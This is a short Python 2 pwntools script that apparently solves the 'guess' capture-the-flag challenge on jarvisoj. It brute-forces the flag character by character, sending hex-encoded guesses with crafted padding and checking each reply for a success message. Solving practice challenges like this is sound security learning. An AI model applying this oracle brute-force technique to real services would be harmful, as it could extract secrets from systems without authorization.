#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
from libnum import *
# context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']

io = remote('pwn.jarvisoj.com', 9878)
flag = 'PCTF{'
word = '0123456789abcdef'
right_num = 1
io.recvuntil('guess> ')
while(1):
    for c in word:
        tmp_flag = flag + c
        # io.recvuntil('guess> ')
    
        payload = hex(s2n(tmp_flag))[2:]
        padding = ''
        for i in range(44):
            padding += '0'
            padding += chr(197+i)
        
        payload += padding[2*right_num:]
        payload += hex(s2n('}'))[2:]
        # print payload
        # raw_input()
        io.sendline(payload)
        reply = io.recvuntil('guess> ')
        print flag
        print reply
        raw_input()
        if 'Yaaaay!' in reply:
            flag = tmp_flag
            print flag
            right_num += 1
            break

io.interactive()

